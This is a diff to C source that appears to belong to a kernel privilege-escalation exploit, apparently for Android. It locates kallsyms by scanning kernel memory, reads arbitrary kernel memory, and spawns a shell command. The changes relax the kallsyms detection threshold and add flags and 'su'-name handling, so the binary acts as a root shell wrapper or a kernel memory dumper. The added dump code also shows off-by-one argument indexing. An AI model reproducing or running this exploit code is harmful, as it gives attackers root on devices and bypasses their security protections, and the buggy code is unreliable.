@@ -772,7 +772,7 @@ int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd, 
             for (int j=0; j<PAGE; j+=0x100) {
                if (isKernelPointer(*(unsigned long*)(page+j)) && increasing((unsigned long*)(page+j), 256/8-1)) {
                     unsigned long count = countIncreasingEntries(i+j);
-                    if (count > 50000) {
+                    if (count >= 40000) {
                        *startP = i+j;
                        *countP = count;
                        return 1;
@@ -1009,17 +1009,41 @@ void checkKernelVersion() {
 
 int main(int argc, char **argv)
 {
-    if (argc >= 2)
-        quiet = 1;
+    int command = 0;
+    int dump = 0;
     
-    if (argc >= 2) {
-        if (0 == strcmp(argv[1], "-quiet")) {
-            quiet = 1;
-            for (int i=1; i<argc-1; i++)
-                argv[i] = argv[i+1];
-            argc--;
+    char* p = strrchr(argv[0], '/');
+    if (p == NULL)
+        p = argv[0];
+    else
+        p++;
+    
+    if (!strcmp(p,"su")) {
+        quiet = 1;
+    }        
+    
+    while(argc >= 2 && argv[1][0] == '-') {
+        switch(argv[1][1]) {
+            case 'q':
+                quiet = 1;
+                break;
+            case 'c':
+                command = 1;
+                quiet = 1;
+                break;
+            case 'd':
+                dump = 1;
+                break;
+            default:
+                break;
         }
+        for (int i=1; i<argc-1; i++)
+            argv[i] = argv[i+1];
+        argc--;
     }
+    
+    if (!dump && argc >= 2)
+        quiet = 1;
     
     checkKernelVersion();
 
@@ -1149,40 +1173,46 @@ int main(int argc, char **argv)
 //           message("SID %u : ", kernel_read_uint(security_ptr + 4 * i));  
     }
 
-    if (argc >= 2 && argv[1][0] == '-') {
-        if (!strcmp(argv[1], "-dump") && argc >= 4) {
-            unsigned long start, count;
-            sscanf(argv[2], "%lx", &start);
-            start &= ~7;
+    if (dump) {
+        unsigned long start, count;
+        start = 0xffffffc000000000ul;
+        count = 0x1000;
+        
+        if (argc >= 2) 
+            sscanf(argv[1], "%lx", &start);
+
+        start &= ~7;
+
+        if (argc >= 3)
             sscanf(argv[3], "%lx", &count);
-            unsigned long startValue = 0;
-            int dump = 0;
-            if (argc >= 5)
-                sscanf(argv[4], "%lx", &startValue);
-            else
-                dump = 1;
-                
-            unsigned char page[PAGE];
-            for (unsigned long i=start; i<start+count ; i+=PAGE) {
-                kernel_read(i, page, PAGE);
-                if (!dump) {
-                    for (int j=0; j<PAGE; j+=8) {
-                       if (*(unsigned long*)(page+j)==startValue) {
-                           dump = 1;
-                           break;
-                       }
-                    }
-                }
-                if (dump) {
-                    printf("%lx:\n", i);
-                    hexdump_memory(page, PAGE);
+        unsigned long startValue = 0;
+        
+        int emit = 0;
+        
+        if (argc >= 4)
+            sscanf(argv[4], "%lx", &startValue);
+        else
+            emit = 1;
+            
+        unsigned char page[PAGE];
+        for (unsigned long i=start; i<start+count ; i+=PAGE) {
+            kernel_read(i, page, PAGE);
+            if (!emit) {
+                for (int j=0; j<PAGE; j+=8) {
+                   if (*(unsigned long*)(page+j)==startValue) {
+                       emit = 1;
+                       break;
+                   }
                 }
             }
-            exit(0);
+            if (emit) {
+                printf("%lx:\n", i);
+                hexdump_memory(page, PAGE);
+            }
         }
+        exit(0);
     }
-    if (argc == 2)
-    {
+    else if (command || argc == 2) {
         execlp("sh", "sh", "-c", argv[1], (char *)0);
     }
     else {
